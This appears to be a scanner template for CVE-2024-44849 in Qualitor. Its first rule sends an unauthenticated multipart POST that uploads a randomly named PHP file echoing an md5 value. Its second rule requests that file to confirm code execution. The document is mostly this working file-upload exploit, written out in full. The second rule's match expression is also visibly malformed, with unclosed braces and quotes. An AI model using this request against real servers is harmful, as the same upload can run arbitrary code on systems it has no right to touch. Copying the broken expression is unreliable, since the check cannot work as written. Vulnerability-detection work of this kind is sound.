cve-id: CVE-2024-44849
set:
  filename: '{{rand_base(12)}}'
  num: '{{rand_int(1000, 9999)}}'
rules:
- method: POST
  path: /html/ad/adfilestorage/request/checkAcesso.php
  headers:
    Content-Type: multipart/form-data; boundary=---------------------------QUALITORspaceCVEspace2024space44849
  body: |
    -----------------------------QUALITORspaceCVEspace2024space44849
    Content-Disposition: form-data; name="idtipo"
    2
    -----------------------------QUALITORspaceCVEspace2024space44849
    Content-Disposition: form-data; name="nmfilestorage"
    -----------------------------QUALITORspaceCVEspace2024space44849
    Content-Disposition: form-data; name="nmdiretoriorede"
    .
    -----------------------------QUALITORspaceCVEspace2024space44849
    Content-Disposition: form-data; name="nmbucket"
    -----------------------------QUALITORspaceCVEspace2024space44849
    Content-Disposition: form-data; name="nmaccesskey"
    -----------------------------QUALITORspaceCVEspace2024space44849
    Content-Disposition: form-data; name="nmkeyid"
    -----------------------------QUALITORspaceCVEspace2024space44849
    Content-Disposition: form-data; name="fleArquivo"; filename="{{filename}}.php"
    <?php echo md5({{num}}); ?>
    -----------------------------QUALITORspaceCVEspace2024space44849
    Content-Disposition: form-data; name="cdfilestorage"
    -----------------------------QUALITORspaceCVEspace2024space44849--
  expression: 'response.body.bcontains(b"parent.showQAlert(\''Upload") && response.body.bcontains(b"showQAlert")
    && response.status ==  200 '
- method: GET
  path: /html/ad/adfilestorage/request/{{filename}}.php
  expression: 'response.body.bcontains(b"{{md5(num) && response.status ==  200 '
severity: critical
type: rce
